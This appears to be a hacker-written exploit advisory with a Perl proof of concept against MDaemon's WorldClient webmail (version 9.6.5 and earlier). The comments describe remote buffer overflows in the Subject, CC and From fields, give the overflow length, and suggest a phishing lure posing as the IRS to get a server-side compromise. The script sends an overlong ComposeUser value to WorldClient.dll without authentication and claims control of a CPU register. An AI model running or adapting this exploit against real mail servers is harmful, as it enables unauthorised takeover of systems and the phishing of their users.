############################################################################
# MDaemon <== v9.6.5 Multiple Remote Buffer Overflow
#
# Vendor Site: http://altn.com
#
# Risk : Highly Critical
# hehe funny bugs here .. the worldclient use the port 3000 for a webmail like (it use also an admin webmail 
# located at 
# port 1000 [by default both are opened])
# this file unfortunatly contain multiple buffer overflows , If you send a message to a user ( or postmaster ? :] )
# with a subject composed of 8194 A ( like : " Do your incomming taxes online this year, it's safe and fast,just reply with 
# the supplied incomming form...8100 A " from incomming@irs.gov etc )
# if the user click "answer" to the message , eip get owned
# the CC & From field is vulnerable too .
#
# This kind of bug is pretty nasty, because the client doesn't get owned , but postmaster yes. so if you have an account 
# on a host providing MDaemon services ,
# you can send a mail to yourself and get some shellcode executed on the server.
# if you dont ... just have a look on google,you'll find out
#
#
# this poc is another bug, actually it shouldn't work, because we dont have any cookie & session ,but it give a full control 
# over EDX without any auth, dont ask why, it's like this only for this variable [ComposeUser] =)
#
# Greetz to : French/Quebec security community & http://spiritofhack.net .
# ungreetz to : they'll reconize them =)
#
# Ps: actually this audit is NOT finished ... there might be some other remote bugs/advisory , i just dont have time for 
# this at the moment, i recommend to the ones who want to do it , to look at Webclient.exe & Webadmin.exe , there's 
# some funny stuff in there hehe .

use LWP::UserAgent;
$connect = LWP::UserAgent->new;
my $payload1 ="a" x 60;
my $payload2 ="b" x 20;
my $host = 'http://127.0.0.1:3000/';

my $req = HTTP::Request->new(POST => $host.'WorldClient.dll?Session=&View=Compose&ComposeInNewWindow=Yes&ChangeView=No&SendNow=Yes');
$req->content_type('application/x-www-form-urlencoded');
$req->content('ComposeUser='.$payload2.$payload1.'%40localhost&&ComposeID=1&Attn=&Company=&From=0&Reply-To=&To=%22admin+bla%22+%3Cadmin%40localhost%3E%2C+&CC=YO&BCC=&Subject=hey&Body=yo%21&');
my $res = $connect->request($req);
print $res->as_string;

# "If in time like these you can talk about individual freedom, you're probably a terrorist"